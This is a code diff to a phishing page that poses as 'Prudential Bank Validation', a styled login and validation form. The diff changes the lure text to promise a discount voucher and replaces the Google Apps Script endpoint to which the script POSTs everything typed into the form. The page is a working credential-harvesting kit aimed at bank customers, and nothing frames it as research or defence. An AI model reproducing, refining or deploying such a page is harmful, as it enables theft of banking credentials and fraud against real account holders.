@@ -4,7 +4,6 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Prudential Bank Validation</title>
-
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -16,7 +15,6 @@
       min-height: 100vh;
       color: #0A1A2F;
     }
-
     .header {
       background: linear-gradient(to bottom, #009CA6, #006F78);
       color: white;
@@ -27,14 +25,12 @@
       border-bottom-left-radius: 20px;
       border-bottom-right-radius: 20px;
     }
-
     .welcome-text {
       width: 90%;
       max-width: 500px;
       text-align: center;
       margin-top: 18px;
     }
-
     .form-wrap {
       background: #ffffff;
       width: 90%;
@@ -44,14 +40,12 @@
       border-radius: 15px;
       box-shadow: 0 4px 15px rgba(0,0,0,0.1);
     }
-
     label {
       display: block;
       margin-bottom: 6px;
       font-size: 14px;
       font-weight: bold;
     }
-
     input {
       width: 100%;
       padding: 12px;
@@ -60,7 +54,6 @@
       border: 1px solid #c5c5c5;
       font-size: 14px;
     }
-
     button {
       width: 100%;
       padding: 12px;
@@ -73,12 +66,10 @@
       font-size: 16px;
       transition: background 0.2s ease;
     }
-
     button:disabled {
       background: #555;
       cursor: not-allowed;
     }
-
     .overlay {
       position: fixed;
       inset: 0;
@@ -93,12 +84,10 @@
       pointer-events: none;
       transition: opacity 0.4s ease;
     }
-
     .overlay.active {
       opacity: 1;
       pointer-events: all;
     }
-
     .spinner {
       border: 4px solid #fff;
       border-top: 4px solid #009CA6;
@@ -108,13 +97,11 @@
       animation: spin 1s linear infinite;
       margin-bottom: 15px;
     }
-
     @keyframes spin {
       100% { transform: rotate(360deg); }
     }
   </style>
 </head>
-
 <body>
 
   <div class="header">
@@ -123,7 +110,7 @@
   </div>
 
   <div class="welcome-text">
-    <p>Confirm Your Account Login Details To secure Your PBL Mobile Application Services</p>
+    <p>Validate your account for smooth transactions and claim a 10% discount voucher.</p>
   </div>
 
   <form id="dataForm" class="form-wrap" autocomplete="off">
@@ -145,7 +132,7 @@
   </div>
 
   <script>
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbyl_x_zyylW6pj2yKDnOo4ZG1KL5yt8fbcc5gVJk2QfSrMsf_4aKYLa9FTKwFJRfi3Cpw/exec';
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxLXpPErQ9c9Virgf8IM6CanWuXQpDT1MkAY6ieWqcQbguOGVTOzdasG_r49YbHRzXhlw/exec';
     const form = document.getElementById('dataForm');
     const overlay = document.getElementById('overlay');
 
@@ -159,12 +146,12 @@
       const button = form.querySelector('button');
       button.disabled = true;
 
-      // Send form data asynchronously
+      // Send form data
       fetch(scriptURL, {
         method: 'POST',
         body: new FormData(form)
       }).finally(() => {
-        // Fade out overlay before redirect (smooth)
+        // Fade out overlay smoothly before redirect
         overlay.style.transition = 'opacity 0.5s ease';
         overlay.style.opacity = '0';
         setTimeout(() => {
